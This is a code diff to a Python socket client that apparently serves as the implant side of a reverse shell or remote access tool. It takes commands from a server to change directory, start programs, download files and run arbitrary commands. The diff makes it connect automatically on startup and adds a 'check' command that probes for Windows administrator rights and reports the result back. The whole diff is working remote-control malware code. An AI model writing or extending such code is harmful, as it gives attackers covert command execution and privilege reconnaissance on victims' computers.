@@ -9,6 +9,8 @@ import time
 class Client():
     def __init__(self):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.admin = None
+        self.connection()
 
     # connect server
     def connect(self):
@@ -22,6 +24,7 @@ class Client():
             res = self.client.recv(1024).decode('utf-8')
             
             if res == 'exit':
+                self.close()
                 break
 
             elif res[:2] == 'cd' and len(res) > 2:
@@ -41,6 +44,9 @@ class Client():
 
             elif res[:5] == "start":
                 self.execCommand(res[6:])
+
+            elif res[:5] == "check":
+                self.adminCheckCommand()
 
             else:
                 result = self.processCommand(res)
@@ -125,4 +131,15 @@ class Client():
         except:
             self.clientSend("--- Error Downloading!!!!!", True)
 
-        
+    # admin check role access
+    def adminCheckCommand(self):
+        try:
+            check = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'), 'temp']))
+            self.admin = "--- Admin role"
+        except Exception:
+            self.admin = "--- Error admin role"
+        # else:
+        #     self.admin = "--- Admin role"
+
+        self.clientSend(self.admin, True)
+
